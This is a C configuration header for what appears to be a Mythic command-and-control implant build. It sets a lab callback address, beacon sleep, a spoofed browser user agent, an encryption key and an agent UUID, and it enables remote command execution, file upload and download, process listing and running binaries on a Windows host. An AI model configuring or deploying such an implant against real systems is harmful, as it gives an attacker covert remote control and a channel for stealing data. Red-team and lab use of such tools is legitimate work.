#ifndef CONFIG_H
#define CONFIG_H

// #define PIC_BUILD
#define PROFILE_MYTHIC_HTTP
#define CONFIG_SLEEP 3
#define CONFIG_SLEEP_JITTER 0
#define CONFIG_HOST L"192.168.56.106"
#define CONFIG_UA L"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
#define CONFIG_POST_URI L"/data"
#define CONFIG_UUID "18c6104f-df97-4b6b-8631-bb95e039e626"
#define CONFIG_ENCRYPT_KEY { 0xfb, 0x0d, 0x67, 0x0f, 0x6b, 0x92, 0x4b, 0x66, 0xd4, 0x2d, 0x96, 0xac, 0xcc, 0x05, 0x0e, 0x1b, 0x61, 0x7b, 0xd5, 0xde, 0x20, 0x55, 0x4a, 0x75, 0xab, 0x9e, 0xf7, 0x46, 0x51, 0x25, 0xa2, 0x4f }
#define REQUIRE_DLL_NTDLL
#define REQUIRE_DLL_KERNEL32
#define REQUIRE_DLL_WININET
#define REQUIRE_DLL_IPHLPAPI
#define REQUIRE_DLL_ADVAPI32
#define REQUIRE_DLL_WS2_32
#define REQUIRE_DLL_BCRYPT
#define INCLUDE_CMD_EXECUTE
#define INCLUDE_CMD_IPINFO
#define INCLUDE_CMD_MV
#define INCLUDE_CMD_MKDIR
#define INCLUDE_CMD_EXIT
#define INCLUDE_CMD_CP
#define INCLUDE_CMD_LS
#define INCLUDE_CMD_RM
#define INCLUDE_CMD_PWD
#define INCLUDE_CMD_SLEEP
#define INCLUDE_CMD_UPLOAD
#define INCLUDE_CMD_WHOAMI
#define INCLUDE_CMD_AGENTINFO
#define INCLUDE_CMD_CD
#define INCLUDE_CMD_DOWNLOAD
#define INCLUDE_CMD_LISTDRIVES
#define INCLUDE_CMD_HOSTNAME
#define INCLUDE_CMD_PS
#define INCLUDE_CMD_EXECUTE_HBIN

#endif
